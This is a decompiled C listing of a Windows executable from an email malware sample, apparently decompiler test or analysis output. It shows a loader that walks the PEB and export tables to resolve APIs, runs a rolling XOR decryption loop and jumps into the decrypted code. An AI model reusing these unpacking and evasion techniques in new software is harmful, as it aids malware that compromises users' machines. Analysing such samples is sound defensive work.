// subject.c
// Generated on 5/4/2015 12:59:19 AM by decompiling malware_via_email/malware_0310/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401040(word32 ebp, selector fs)
{
	word32 edi_14;
	word32 edx_15 = fn00401160(fs, out edi_14);
	Mem19[fp + 0x0002E272 - edx_15 + 0x00000040:word32] = edx_15;
	word32 eax_26 = (edx_15 << 0x00000008) + 0xFD5D3E40 & 0x02E1D200 - (edx_15 << 0x00000008);
	word32 edx_35 = fp + 0xFFFD1D1A + dwLoc20;
	Mem36[edx_35 + 0x00000000:word32] = (eax_26 + 0xF474D84C)[edx_15 * 0x00000400] - 0x00000028;
	word32 eax_40 = eax_26 + Mem36[((eax_26 + 0xF474D84C) + (edx_15 << 0x0000000A)) - 0x00000004:word32] + 0x0002E2FA - dwLoc20;
	word32 ebx_45 = Mem36[fp + 0xFFFD1D0E + dwLoc20:word32];
	word32 esi_46;
	word32 ecx_47 = fn00401280(ebx_45, out esi_46);
	Mem50[fp - 0x00000060:word32] = fp - 0x00000008;
	Mem52[fp - 0x00000064:word32] = 0x00000004;
	Mem54[fp - 0x00000068:word32] = ecx_47;
	Mem56[fp - 0x0000006C:word32] = esi_46;
	word32 ecx_60 = Mem56[fp + 0xFFFD1D0E + dwLoc20:word32];
	fn004011B0(ecx_60, edi_14, ebp);
	Mem62[fp - 0x00000070:word32] = dwLoc20;
	Mem68[fp - 0x00000074:word32] = dwLoc14;
	Mem70[fp - 0x00000078:word32] = eax_40;
	(dwLoc20 + 0x003D2E2E)();
	Mem85[fp - 0x0000007C:word32] = 0x00000000;
	word32 v13_82 = eax_40 + 0x0002E302 - dwLoc20;
	Mem90[fp - 0x00000080:word32] = v13_82 + 0x00000BCA;
	v13_82();
	int3();
	int3();
	int3();
	int3();
	int3();
	int3();
	int3();
	Mem92[fp - 0x00000084:word32] = fp - 0x00000004;
	word32 edx_96 = Mem92[fp - 0x00000074:word32];
	word32 ecx_116 = Mem92[fp + 0xFFFD1CB6 + edx_96:word32];
	word32 ebx_101 = (fp + 0xFFF4743C)[edx_96 * 0x00000004];
	Mem103[fp - 0x00000090:word32] = 0x1B563BF2;
	Mem107[fp - 0x0000008C:word32] = Mem103[fp - 0x00000090:word32];
	word32 edx_105 = (edx_96 << 0x00000002) + (edx_96 << 0x00000002) * 0x00000002;
	Mem110[fp - 0x0000008C:word32] = Mem107[fp - 0x0000008C:word32] - edx_105;
	Mem115[fp - 0x00000088:word32] = 0x00000001;
	word32 eax_106 = edx_105 + 0x12CAFF56;
	Mem121[ebx_101 + 0x00000000:word32] = Mem115[ebx_101 + 0x00000000:word32] ^ eax_106;
	ecx_116 = ecx_116 - 0x00000004;
	while (ecx_116 > 0x00000000)
	{
		eax_106 = eax_106 + Mem121[fp - 0x0000008C:word32] + Mem121[fp - 0x00000088:word32];
		ebx_101 = ebx_101 + 0x0002E2D6 - Mem121[fp - 0x00000074:word32];
		Mem131[fp - 0x00000088:word32] = -Mem121[fp - 0x00000088:word32];
		Mem121[ebx_101 + 0x00000000:word32] = Mem115[ebx_101 + 0x00000000:word32] ^ eax_106;
		ecx_116 = ecx_116 - 0x00000004;
	}
	return;
}

word32 fn00401160(selector fs, ptr32 ediOut)
{
	word32 edi_6;
	word32 eax_17 = fn00401260(fs, 0x00000017, out edi_6) + 0x00000002 + Mem0[0x00401010:word32];
	eax_17();
	word32 edx_28 = Mem0[edi_6 + 0x00000BF4:word32];
	word32 edi_30;
	*ediOut = edi_6 - (edx_28 - 0xBFFD1D86);
	return edx_28 - 0xBFFD1D86;
}

void fn004011B0(word32 ecx, word32 edi, word32 dwArg00)
{
	word32 eax_4 = fn004011C0(ecx, edi);
	fn004011E0(eax_4, ecx);
	eax_4();
	return;
}

word32 fn004011C0(word32 ecx, word32 edi)
{
	return Mem0[Mem0[Mem0[Mem0[Mem0[edi + 0x00000030 + ecx:word32] + 0x0000000C:word32] + 0x0000001C:word32]:word32] + 0x00000008:word32];
}

void fn004011E0(word32 eax, word32 ecx)
{
	word32 esi_24 = Mem0[Mem0[Mem0[eax + ((ecx << 0x00000001) + 0xFFFD1D6A) - ecx:word32] + eax + 0x00000078:word32] + eax + 0x00000020:word32] + eax;
	Mem32[fp + 0x0002E2CA - ecx:word32] = 0x56035735 - ecx;
	word32 dwLoc0C_36 = 0x00000000;
	while (dwLoc08 != Mem32[((Mem32[esi_24 + dwLoc0C_36:word32] + eax) + 0xFFFD1D3A) + ecx:word32])
		dwLoc0C_36 = dwLoc0C_36 + 0x00000004;
	return;
}

word32 fn00401260(selector fs, word32 dwArg04, ptr32 ediOut)
{
	word32 edi_10;
	*ediOut = Mem0[fs:dwArg04 + 0x00000001:word32];
	return 0xFFFFFFFE;
}

word32 fn00401280(word32 ebx, ptr32 esiOut)
{
	word32 eax_11 = (ebx << 0x0000000A) + 0xF4B4CA80 >>u 0x00000010 << 0x00000010;
	word32 esi_12;
	*esiOut = eax_11;
	return Mem0[eax_11 + (Mem0[eax_11 + (0x0B8B483C - (ebx << 0x0000000A)):word32] + 0x00000014):word32];
}

